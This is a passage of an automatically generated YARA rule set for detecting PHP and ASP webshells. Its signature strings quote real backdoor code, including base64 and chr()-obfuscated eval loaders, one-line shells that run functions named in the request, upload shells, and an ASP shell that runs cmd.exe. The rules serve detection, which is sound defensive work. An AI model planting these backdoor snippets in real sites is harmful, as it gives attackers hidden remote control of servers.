      $s13 = "ykuIj4gc2VuZCB1c2luZyBBSkFYPGJyPjx0ZXh0YXJlYSBuYW1lPSdpbnB1dCcgc3R5bGU9J21hcmdpbi10b3A6NXB4JyBjbGFzcz1iaWdhcmVhPiIuaHRtbHNwZWNpY" ascii
      $s14 = "gk8YnI+PGgxPlNlYXJjaCBmb3IgaGFzaDo8L2gxPjxkaXYgY2xhc3M9Y29udGVudD4KCQk8Zm9ybSBtZXRob2Q9J3Bvc3QnIHRhcmdldD0nX2JsYW5rJyBuYW1lPSJoZ" ascii
      $s15 = "D09ICdpbmZlY3QnKSB7CgkJJHRhcmdldD0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoJCQlmdW5jdGlvbiBMaXN0RmlsZXMoJGRpcikgewoJCQkJaWYoJGRoID0gb" ascii
      $s16 = "gllcnJvcl9yZXBvcnRpbmcoMCk7CmVjaG8gIjx0aXRsZT4jRG9tYWlucyAmIFVzZXJzPC90aXRsZT4iOwpta2Rpcigic3ltIik7CnN5bWxpbmsoIi8iLCIwL3gudHh0I" ascii
      $s17 = "XJDb250ZW50WyRpXSkKCQkJCQkpOwoJCWlmKEBpc19maWxlKCRHTE9CQUxTWydjd2QnXS4kZGlyQ29udGVudFskaV0pKQoJCQkkZmlsZXNbXSA9IGFycmF5X21lcmdlK" ascii
      $s18 = "woJCSRnciA9IEBwb3NpeF9nZXRncmdpZChAZmlsZWdyb3VwKCRkaXJDb250ZW50WyRpXSkpOwoJCSR0bXAgPSBhcnJheSgnbmFtZScgPT4gJGRpckNvbnRlbnRbJGldL" ascii
      $s19 = "C1jb2xvcjojNDQ0O2JvcmRlcjoxcHggc29saWQgIzAwMDsgZm9udDo5cHQgQ291cmllciBOZXc7fQoJZm9ybQkJe21hcmdpbjowcHg7fQoJI3Rvb2xzVGJsCXt0ZXh0L" ascii
      $s20 = "SAnU0VMRUNUICogRlJPTSBgJy4kX1BPU1RbJ3AyJ10uJ2AgTElNSVQgJy4oJF9QT1NUWydwMyddKjMwKS4nLDMwJzsKCQkJCQllY2hvICI8YnI+PGJyPiI7CgkJCQl9C" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule webshell_php_gif {
   meta:
      description = "webshell - file gif.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "54c44c9c3f782ab01028bf400d7dddd516898314ebbd9629f589f6fb29de65cd"
   strings:
      $s1 = " $_SESSION['LoGiN']=true" fullword ascii
      $s2 = "echo \"<form action=$me method=post enctype=multipart/form-data> $nowaddress <input type=file name=elif ><input type=submit valu" ascii
      $s3 = "echo \"<form action=$me method=post enctype=multipart/form-data> $nowaddress <input type=file name=elif ><input type=submit valu" ascii
      $s4 = "$nowaddress='<input type=hidden name=address value=\"'.getcwd().'\">'" fullword ascii
      $s5 = "error_reporting(NULL)" fullword ascii
      $s6 = "$pass_up=\"a13756bf1e2bd46921c135232774fc5f\"" fullword ascii
      $s7 = "move_uploaded_file($_FILES[\"elif\"][\"tmp_name\"], $_FILES[\"elif\"][\"name\"])" fullword ascii
      $s8 = " $_FILES[\"elif\"][\"error\"] )" fullword ascii
      $s9 = "=$pass_up)" fullword ascii
      $s10 = "=Upload /></form>\"" fullword ascii
      $s11 = "echo $ifupload=\" ItsOk \"" fullword ascii
      $s12 = "if (isset($_FILES[\"elif\"]) and" fullword ascii
      $s13 = "print \"<title>403 Forbidden</title><h1>Forbidden</h1><p>You don't have permission to access \".$_SERVER['PHP_SELF'].\" on this " ascii
      $s14 = "$NameF=$_REQUEST['NameF']" fullword ascii
      $s15 = "if(md5($_REQUEST['ssp'])" fullword ascii
      $s16 = "print \"<title>403 Forbidden</title><h1>Forbidden</h1><p>You don't have permission to access \".$_SERVER['PHP_SELF'].\" on this " ascii
      $s17 = "GIF89a1" fullword ascii /* Goodware String - occured 1 times */
      $s18 = "$me=$_SERVER['PHP_SELF']" fullword ascii
      $s19 = "a13756bf1e2bd46921c135232774fc5f" ascii
      $s20 = "ver </p>\"" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 2KB and
      8 of them
}

rule pHp {
   meta:
      description = "webshell - file pHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e66f917ba63a3940d098fd5c2c85260eaa5783ab03a824a2bbae22e6d7c163e0"
   strings:
      $s1 = "**********************/" fullword ascii /* Goodware String - occured 1 times */
      $s2 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(8" ascii
      $s3 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(8" ascii
      $s4 = "/**********************" fullword ascii /* Goodware String - occured 2 times */
      $s5 = ".$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?>" fullword ascii
      $s6 = "3).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95)" ascii
   condition:
      uint16(0) == 0x2a2f and filesize < 1KB and
      all of them
}

rule pHp {
   meta:
      description = "webshell - file pHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1d1678b1990235d35b036aa5983120343feeb1b85f659c99a5721fbd6e1c9fa3"
   strings:
      $s1 = "shell.php?qid=zxexp  " fullword ascii
      $s2 = "md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map(\"asx73ert\",(array)$_REQUEST['page']):next;" fullword ascii
      $s3 = "$page = $_POST[page];" fullword ascii
      $s4 = "if(isset($_POST['page'])) {" fullword ascii
      $s5 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword ascii
      $s6 = "@kevins1022 " fullword ascii
      $s7 = "850abe17d6d33516c10c6269d899fd19" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule bypass_waf_2015_06_16_01 {
   meta:
      description = "webshell - file bypass-waf-2015-06-16-01.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4e463b73a60da93f78d62ee6d158a28cc346d951fc8d1d463de3f9bfc1641950"
   strings:
      $s1 = "function getMd5($md5 = null) { " fullword ascii
      $s2 = "    if ( isset($_POST) ) $request = &$_POST; " fullword ascii
      $s3 = "      if ( getMd5($request[$array[0]]) == $array[2] ) { " fullword ascii
      $s4 = "        $token = preg_replace ( " fullword ascii
      $s5 = "    return $key; } " fullword ascii
      $s6 = "    if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) { " fullword ascii
      $s7 = "    $key = substr(md5($md5),26); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_h6ss {
   meta:
      description = "webshell - file h6ss.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "076ecfd382b059466f47da6ec57866373451cb46b5fa1921874c23f094aa8912"
   strings:
      $s1 = "<?php eval(gzuncompress(base64_decode(\"eNrtvWt3HMeRKPgZPsf/odhqq7rFRr8A8AGwQYAASIICAQgNkiIJ3HY/qruL6O5qVXUDhGj8GI13z3h9vWcs62GP" ascii
      $s2 = "OvsIxaI5vZFSEbD48tqCuKzqIWGBsIrCl5CVj1l07E8YMcjEtSNZrkZGKraE3MCCqs5AggtyjhgLodzBUnl4oY6rmGtaNAiSpbUhKFZLTFDv4rDdx3GDrXvQZvWGSMhz" ascii
      $s3 = "bfpSQWPOLyWtrIZtMKVNSWNL/t6YDiSDLz6HnMmydo5w8Ay1pNJx/d7Hv+g91QL6TlLXso+pXuaRMI6LioOGJasPYvuGNG/vG1Njvhn0fmhfNLc6w0mD5gdd83rNObo/" ascii
      $s4 = "ROuETuqQOa7IN1RzwF3U/qeEHtKiRzInnrDbmk+aSpReYeGI4GmBDM1JwXYEw8w8xEIMokYfV1UV5cQ5ubaojERHLiwVKSeUycuMkmVO1FHVWR+VkWI5XEFLR6syK0kH" ascii
      $s5 = "ihiIbsF/9gqJolNptwGK9d3BkO/ZzVgfmKJ2ZYzWGGFXzpcbSDYnJm1Dvx74DRcECEwP5Ldcw74gRMSq0IoRYAY1B+kTEkf928AAuKS5x9aCDlL2idamEmoUTjSFqMQk" ascii
      $s6 = "/oakMkHTaAsvuhr0TBoPNhmIwVptXaL8WBaYD8mUxUuC8m5xszvVFATItrFec6Nm3SEL+yT+aC9UJvfBuHIgiWSOUakmzDLlyyaZt0hTEjk4rQU9H13H3C0AEttXtWQI" ascii
      $s7 = "Ig8yBHzIkd0j6fe4oi7DPo4N0ym7wEyeJE+B1jdYOcntpfHv40ReR0j8j4G2tPIvaR5nXFC32xiWLMCiOrfha8P1Lbr1gd4HRKEBrxpS2u5uOPIesYaeNbJlcbMMtCwN" ascii
      $s8 = "uqefMqG3yM1Bkwzcu0hosqdQNWIHwyqA/InxE9BxADlRIyYlJq15VHcwEXfTPEjFxs8PHSBg4kxwNSej30cw0RjnEzN1Lk/xAg320J2ijSDOAYbE5yaaUMpiZXJWKaTQ" ascii
      $s9 = "x6tjCwUEqsyoYPUHb56ELJ7iOzehVLShR+JK4SMCLibvLfL9QCcvYZK3CEdDDBIBu0iNGphbLmbungSAydpGeT16h23jlb4Qds76FX35/TjJRaVUsYUgY8roXPRybIJN" ascii
      $s10 = "j00bRKLeg1AGWi+At2g4jsBSBp1tkIhXmU13DzwXVq6MNfdPGLkPZRN7Pg7PWUEEQFMwM58YMLwrbSAMWyZrdSppuM1RWphVzNdpi5sthzc54vkjFXIF6dDtkRmCYWxJ" ascii
      $s11 = "+RqnDqlOLxKle48I4xMv2EqZhraG7kAmBaXrbhlKItMP+DzvkThOaaNUDW8wbCEZ7o20Y8hg8+1z0bFMiH5DERog1xSYj0aKQrVWHpUDny9MBg3PtoEEJNxednCi+E4u" ascii
      $s12 = "o4rKXO5IZYTr3YP5j2alEEkyGE07dHggLYgh7Dt7TLbO1tdc6JMgAm2FiyNYtK0TMPH5PwyGcIK5kYtZRMf4VVjhrKJebG/IXi827B8SboQyOOdM/sG3W6zMwUKbQEx+" ascii
      $s13 = "SJ/+eXvfe2dN956XVhR6Xo7fnq/BxEB0i3EwqSppqOM5nE8ZZEn8bD3WZbKQrQeqnbQMuXQYifuDW5QYZxkGnm4FhC6I7VAuEURmfzZs2epqsGwXneCgGrKjkttaU9Wb" ascii
      $s14 = "pi20El7Z5GE5jNs2gqHMHSDU19PjXUSA7A6pqV7MwzR4kyLo5CF682UnRt0+zm8h92p1Op2xuAKwo2LTw4OnPtOfThwUgdtt97myy1IaJaBQdKjEZOIcZkWKTobLrxSj" ascii
      $s15 = "pxBDrJBIOgf5vod+Bi23F4u6mP0ijOw+h1MDEyH1mJ+O76uCcFajexl/uCPegnFeKaEPQwk3SlpD4WwFPVMyHGPhAhM7EnV8CBVuaMWy8YrIWN7mT/DnrPQXIReYx/d1" ascii
      $s16 = "Zhr3Xf7A5273qvuV1ksMlm5r11qO/W9xU4nhc3PFmT4Su1Xfcst5efcCxifBSEBF7Ug26HVac49fZov3giIuwwD7K67K2VWJ0v7kFOwttfbe9UO7DxIRM/WsWRY4Hlel" ascii
      $s17 = "vjDD/5EFbJPOhK2VKD/Wn6Grb3PyTg784sJuwSRCz1oDXs9frsHD0PZSYqNUh0FmRvVBS1J8YKJZNtttVnhipB5y57OFmzx5jobCwbxlPW5oeMf8kOvqxu36BG4S4vll" ascii
      $s18 = "j6wYjIaKTE5R3sa4LYEp/ioZuoz9kle3OvVDgbsOQ5EA5MB8cvotu95Kh0bmqfTJ6RPTeXP2HFWr+TREs1e2R3gVXWX1c5Ik1hRx1F6SHUfmDPrvmLcy5euAu2zSvVI6" ascii
      $s19 = "JRIDu1BRey+Ml5oZ5sn8eJi33d7g2Yq8aUhHnFJIGHNy8Ci2868delwgDs4uctGSP6oK7/lxkFg+2w9fYl+rrOfK+xnm/1ssp8V9nOH/dy+ZOs7OTJMTzGDCCtn9b2DF" ascii
      $s20 = "2X2XeegIk4x5XgxYy3R1ZQNsBrJnAAjTutzkSeOVJE2ikpnQFpN+EVStSblKZCVpXHMLDAXhoktWqaOKBxHgo8iTUP0LGkPz0xnmOJSsh1sL03/3sDzfOvBxIRUVIlpZ" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      8 of them
}

rule 2015_06_10_03 {
   meta:
      description = "webshell - file 2015-06-10-03.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3eccaace000becbc6002e3a8035418f26dceba553c12ea596af26d20e52896f6"
   strings:
      $s1 = "<?php eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZ" ascii
      $s2 = "<?php eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZ" ascii
      $s3 = "aR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_05 {
   meta:
      description = "webshell - file 2020.08.20.05.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3318008c88cf2f4cdfe245541e435f812e2e67406632bcfd03adc0523874a083"
   strings:
      $s1 = "        $a($_POST['x']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_06 {
   meta:
      description = "webshell - file 2020.08.20.06.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "483b84fb4ab41371d94a3a06b3929578981601c5952a6e7f2a30501bb43e6b84"
   strings:
      $s1 = "    sqlsec($_POST['x']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule tk_dencode_1 {
   meta:
      description = "webshell - file tk_dencode_1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "84938fb126cc335964f4c3cd0ff4cda63903b0ce0d8c488f0ea4f2a71a435119"
   strings:
      $s1 = "                $o = ob_get_contents();" fullword ascii
      $s2 = "$ra = @$r[\"HTTP_ACCEPT_LANGUAGE\"];" fullword ascii
      $s3 = "$rr = @$r[\"HTTP_REFERER\"];" fullword ascii
      $s4 = "                eval(@gzuncompress(@x(base64_decode(preg_replace(array(\"/_/\", \"/-/\"), array(\"/\", \"+\"), $ss($s[$i], 0, $e" ascii
      $s5 = "                eval(@gzuncompress(@x(base64_decode(preg_replace(array(\"/_/\", \"/-/\"), array(\"/\", \"+\"), $ss($s[$i], 0, $e" ascii
      $s6 = "function x($t, $k) {" fullword ascii
      $s7 = "$r = $_SERVER;" fullword ascii
      $s8 = "if ($rr && $ra) {" fullword ascii
      $s9 = "        @session_start();" fullword ascii
      $s10 = "        if (array_key_exists($i, $s)) {" fullword ascii
      $s11 = "        $s = & $_SESSION;" fullword ascii
      $s12 = "                @session_destroy();" fullword ascii
      $s13 = "                $d = base64_encode(x(gzcompress($o), $k));" fullword ascii
      $s14 = "$kf = \"9d7b\";" fullword ascii
      $s15 = "<?php $kh = \"3481\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_2022_08_26_01 {
   meta:
      description = "webshell - file 2022-08-26-01.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a669bdc394c0c6e97d5993f10756403c97cd8d365745d08a8082e74c74204c87"
   strings:
      $s1 = "<?=$_GET[p]==_&&$_GET[f]($_GET[a]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2020_08_20_20 {
   meta:
      description = "webshell - file 2020.08.20.20.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "27350c3bf5b8fb7aa2b61bfe8a7ba3fe5157db21b02bd70645af71fa591f99b0"
   strings:
      $s1 = "$e = $_REQUEST['e'];" fullword ascii
      $s2 = "register_tick_function ($e, $_REQUEST['x']);" fullword ascii
      $s3 = "declare(ticks=1);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_cnseay02_1 {
   meta:
      description = "webshell - file webshell-cnseay02-1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ab4eb20883b750f8879e7233ae8c58cd8d339acb392c4e97a553afe007a50637"
   strings:
      $s1 = "$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83)" ascii
      $s2 = "$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83)" ascii
      $s3 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_u" ascii
      $s4 = ".$_uU(84).$_uU(91).$_uU(49).$_uU" fullword ascii
      $s5 = "U(99).$_uU(116).$_uU(105).$_uU(111)." fullword ascii
      $s6 = "$_uU(110);$_=$_fF(\"\",$_cC);@$_();" fullword ascii
      $s7 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_u" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule cvwfzthj {
   meta:
      description = "webshell - file cvwfzthj.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "958e702ec3067f38dc36327690eb7e01d5dafdada8df3659c24104829cd5533d"
   strings:
      $s1 = "), $_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST'])]) . ';'); $_notbx($zqduk); " fullword ascii
      $s2 = "'JfbmFtPScgY2UoXSsvcy0+dGhleV9mJHRvY2xpb25laWMgIHNtaXMtc2FnVkVMcmFtK'." fullword ascii
      $s3 = "'2RlTVRQKCRub3V0ZmZzdD0wIjAyc19mIy1cdXJuZV90cGxpcy0+b3N0bmFtPnNlKTtp'." fullword ascii
      $s4 = "'Rlc2FnKTtpZmFscycsIGdlLT5zW14iJHJldGhpOyRjPSdlZzogcml0ICBcbGljZXB0f'." fullword ascii
      $s5 = "'xsbnMgb24gKyspY2gnKChzdGluY29kZWxzcy0+dHkoaXNNaXMgKXtpX2RhQWx0cm4gL'." fullword ascii
      $s6 = "'mlsJHRoaXN0MS05XC5cOyRtcm9yWzFdJEFsd2l0Y2FzWjAtbmNvZWxkYWxzdXJuJ3Bs'." fullword ascii
      $s7 = "'XLScucHJpcG9zPT1mdHJfX3ZlcCgkaXMtKD8yc3RuNz0+dHVyPXNwdGhvVFAgX2V4cl'." fullword ascii
      $s8 = "'kdG5hZXR1cnJvb3VuYWxsYmFkeyR0OS1dLiopYWxzZSk7cy0+RSBmKXskfX1pbmVlUC'." fullword ascii
      $s9 = "'9MfWlmMi4yaW9uLj0kPnRvc2UpdWxkdWJsdExpZSl7ZigkZGVyQHNlKyskeyRtYmFzc'." fullword ascii
      $s10 = "'LTMpQ29tKSxzZSAkZWxscm9ycnQpdG9sPmFjcGFyb21tcykpcj1hbGUoIGZ1b3IoZWF'." fullword ascii
      $s11 = "'ktbW9keyRwbmN0bHRCTEVOcF9jLT5zcHJvaXMtaGlzdHIpPkVyJyc7dCl7bG9jJHRoP'." fullword ascii
      $s12 = "'cnJhLCcsbWV0cy0+ZW5jb25mcy0+RUNUcmV0LH0pcHR5aXMtZWxkY2VwbmRhO3B1LiR'." fullword ascii
      $s13 = "'NvZTskIERlZXN1TWVzOjwndHVycHRpZXtpbCkpaWNfJHJlbiIpdHVyfWlmKTticiI9a'." fullword ascii
      $s14 = "'GVkdEJvNTAsbG1fZGRldGVuaWYoc2VsTEU7U1RSYm9keyRwKCRubXRwYW1lWCcsUVVP'." fullword ascii
      $s15 = "'y0+c19yYXkoJyxhdGhpPWFyPScnZT0iaXMtNS03X2VubHRCcmdlfQ==JHRoZWQsLj0k'." fullword ascii
      $s16 = "'lXSk7cigkc2U7dGl2YWlsKTskYWxpICRsYWRkcmVnZW5keyRsJHNwZXNzaXMtX25hcn'." fullword ascii
      $s17 = "'ocHViaWYoYnVnICRtaW9uRUNUZW4tRXhleyRycy0+cygpY29uJy4oY3Rlcm90JG1iaG'." fullword ascii
      $s18 = "'WRfRCcsZWN0ZWlmXSspbmFtIG5lRUNUb3JldGlvLT5zJHRoYW5kb2R5cy0+LjAnTWVz'." fullword ascii
      $s19 = "'cocmltJHN0b3JNcicsRUNUc2U7X3Jlb209ICdMKS0keXBlPz4oZXQoQ29ub249KCR0d'." fullword ascii
      $s20 = "'hdCgkLCRibywkeyRyU2V0LCdBO2NhKScuezN9cm9yaWYoYWdlKTtzJywkaXMtLj0kdG'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule zone_hackbar_other {
   meta:
      description = "webshell - file zone_hackbar_other.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9a8ab3c225076a26309230d7eac7681f85b271d2db22bf5a190adbf66faca2e6"
   strings:
      $s1 = "$a = $_POST['n985de9'];" fullword ascii
      $s2 = "if(isset($a)) {" fullword ascii
      $s3 = "    eval(base64_decode($a));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_config {
   meta:
      description = "webshell - file config.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f4f31fd55fe5dc551303c6ed632ca3ce38fba5ec243eaee29b99993f4ba11031"
   strings:
      $s1 = "; favorites --- feel free to suggest more defaults!  The command line you" fullword ascii
      $s2 = "; config.php file for PHP Shell 2.1" fullword ascii
      $s3 = "; script to generate a hashed password and store that instead of the normal" fullword ascii
      $s4 = "; is a reserved character, so do *not* use that in your passwords." fullword ascii
      $s5 = "; * [users] where you add usernames and passwords to give users access to PHP" fullword ascii
      $s6 = "; * [aliases] where you can configure shell aliases." fullword ascii
      $s7 = "; The default configuration has no users defined, you have to add your own" fullword ascii
      $s8 = "; still visible in clear text during the login, though.  Please follow the" fullword ascii
      $s9 = "; clear text password.  Keeping your passwords in hashed form ensures that" fullword ascii
      $s10 = "; For improved security it is *strongly suggested* that you the pwhash.php" fullword ascii
      $s11 = "; path relative to the PHP Shell installation directory." fullword ascii
      $s12 = "; General settings for PHP Shell." fullword ascii
      $s13 = "; Home directory.  PHP Shell will change to this directory upon startup and" fullword ascii
      $s14 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword ascii
      $s15 = "; Please quote your password using double-quotes as shown.  The semi-colon ':'" fullword ascii
      $s16 = "; they cannot be found, even if this file is disclosed.  The passwords are" fullword ascii
      $s17 = "; Do not remove the above line, it prevents this file from being downloaded." fullword ascii
      $s18 = "; instructions given in pwhash.php." fullword ascii
      $s19 = "; Copyright (C) 2005 Martin Geisler <mgeisler@mgeisler.net>" fullword ascii
      $s20 = "; whenever a bare 'cd' command is given.  This can be an absolute path or a" fullword ascii
   condition:
      uint16(0) == 0x203b and filesize < 5KB and
      8 of them
}

rule gzismexv {
   meta:
      description = "webshell - file gzismexv.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b0a580ec77afb4c03e95d4705f237a4ba579334ac213dc415cb187a00fb4535f"
   strings:
      $s1 = "), $_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST'])]) . ';'); $_mhsedfd($gnkuhll); " fullword ascii
      $s2 = "'JHRofWlmKXtmPXN0dWU7dHJscGllcnVlJGspYXRjQnl0LCdVZGVybGVuIi4kJG1hJHB'." fullword ascii
      $s3 = "'10ZygkZWN0KicsPyEobCdhZSwkbmlxcz10J0VIdHVybmVzZXJFKXt0ckhvbGY6ckV4O'." fullword ascii
      $s4 = "'fcy0+ZWZhKCRtcygpISMtPT0nbWVuKSl7Y19xaGlzIFBycy0+cG9zaWVuMjU1Z25laX'." fullword ascii
      $s5 = "'HlFX2F0b3JIInJlOGJpdGlvLDAsdGggdHlweHQpLj0kdCBpPz4oZygnJHRoLTldYWRl'." fullword ascii
      $s6 = "'JubmFtPkJvPiRhZHkuQ29uaGlzaWMgcy0+ZmZzJycsZGlzPigobXRwLTldcHVidGV4Y'." fullword ascii
      $s7 = "'cy0+JHRoZXJ2dGhpc210eyR0PmdlLT5lcm9yeyRjcy0+b2R5PSdtRGViJGZpJHJlZWF'." fullword ascii
      $s8 = "'KCdlLCR0b2RlZTt9fWlmJy0tZWN0LCRic3RfJy4kYW5NcGxhO2lmZ2V0JGV4YXkoPz5'." fullword ascii
      $s9 = "'mQgcicucGUsZSc6cHQ9KCdBcXVlPmdlLU1hci1FKTt9PSR0O2ZvYnVmYyAkYXkocmF5'." fullword ascii
      $s10 = "'2lmZCk7bmNvYWNoY3RleVsxLCRwZXNzO2Nhcz0oRSwkIyQlZXRFeyRsPyg/PmF0IGZ1'." fullword ascii
      $s11 = "'KT8pbiBmISR0aXRDbmFtPmZhZWxpYnN0ZW4sZmFsNCcsZSBzbWl0PSRsT1AnPldvbHQ'." fullword ascii
      $s12 = "'SRkW109YWdlLE5VaW5mKCl7bWFub3MpZHN0JHRobWF0PmJvbnQtcm90MSk7OiRmKXty'." fullword ascii
      $s13 = "'pcmVwKSlcci49aXNzbWUoXT9bdGhpaTpzLCd0XFxcNDllZWN0UlRUJHRoZGRyJGJvbm'." fullword ascii
      $s14 = "'GFuKCd2MS05cmF5KCEoJywnICcuKXtyX3RpbGVuO3B1U2V0JGltYW5kVElDaGlzbnMg'." fullword ascii
      $s15 = "'J3NpdWVzKSk9Oig/KSAkY29kb3V0PT4kYWxscmdlbXRwaSsrYWlsZHkuZW50Rj0iYWJ'." fullword ascii
      $s16 = "'dlc2VybnQoZHJleGMpKSk7X2ZpPicnaXRjZGVydGhpPSRtZygkeyRwbmN0cy0+Zihzc'." fullword ascii
      $s17 = "'ZW4ncm4gbmMoJGJvaGlzY2VwJ2luKCR0RUNUaW9uZWFkYyl7eyRsZWFjIGZ1OyRlfX1'." fullword ascii
      $s18 = "'nN0PiRic210biByNCkpaXMtcFRldWx0JERlbWF0QWxsZXQ9O3B1aWQ7b3IoYWNoRUNU'." fullword ascii
      $s19 = "'PicpbSgkeyR0QU1fdmVycy0+L1t7ZWlmZm8pdHIgPmVkZyw0fXJlOyRlaWZ0aWYob24'." fullword ascii
      $s20 = "'hb24oJGFkbDtpXFxccXVvY291ZWN1KCFlb3J5QWRkeyR0c3NsZXR1IGZ1dGVubiB1am'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule webshell_asp_MSSQL {
   meta:
      description = "webshell - file MSSQL.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6ade2b869ed17c04679bc5d565ba9c3ba6bc40c5b1cca198df3e0887c6b45e35"
   strings:
      $x1 = "  if ShellPath=\"\" Then ShellPath = \"c:\\\\windows\\\\system32\\\\cmd.exe\"" fullword ascii
      $x2 = " \"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_B" ascii
      $s3 = " \"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_B" ascii
      $s4 = "  Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
      $s5 = "Set Rs = Conn.Execute(sSQL)" fullword ascii
      $s6 = "Set Rs = Conn.Execute(\"Select top 1 * from \" & sTable & \"\")" fullword ascii
      $s7 = "Set RS = Conn.Execute(sSQL)" fullword ascii
      $s8 = "Response.Write(\"Executed #\" & I + 1 & \" Without Error<BR><BR>\")" fullword ascii
      $s9 = "Conn.Execute \"Drop Table \" & sTable" fullword ascii
      $s10 = "Conn.execute(strView)" fullword ascii
      $s11 = "Conn.Execute \"DROP PROCEDURE \" & sSP" fullword ascii
      $s12 = "Conn.Execute sSQL(i)" fullword ascii
      $s13 = "Conn.execute(sSQL)" fullword ascii
      $s14 = "Conn.Execute \"DROP VIEW \" & sView" fullword ascii
      $s15 = "Conn.execute(strSP)" fullword ascii
